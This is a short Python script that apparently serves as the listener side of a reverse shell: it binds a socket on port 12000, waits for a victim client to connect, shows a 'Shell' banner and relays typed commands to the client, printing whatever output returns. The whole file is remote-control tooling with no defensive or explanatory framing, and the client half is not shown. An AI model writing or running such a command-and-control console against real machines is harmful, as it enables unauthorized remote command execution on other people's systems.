import os
import socket
import threading
import random
from art import *

os.system("cls")
print("[!] Server Started")
s = socket.socket()
host = 'IP-GOES-HERE'
port = 12000
s.bind((host, port))
s.listen(1)

def alive():
    c.send("alive".encode("utf-8"))
    data = c.recv(1024)
    data = data.decode("utf-8")
    print(data)

def send_command():
    global c
    global addr
    print("\n\n")
    request = input("C:>")
    if request == "alive":
        alive()

    elif request == "":
        send_command()

    else:
        c.send(request.encode("utf-8"))
        # Command sent waiting for returned data
        data = c.recv(1024)
        print(data)
        data = data.decode("utf-8")
        print(data)
    send_command()



def start():
    global c
    global addr
    print("[!] Waiting for connection from client\n")
    while True:
        c, addr = s.accept()
        os.system("cls")
        tprint("Shell")
        print(f"[!] Connected : {addr}")
        send_command()

start()
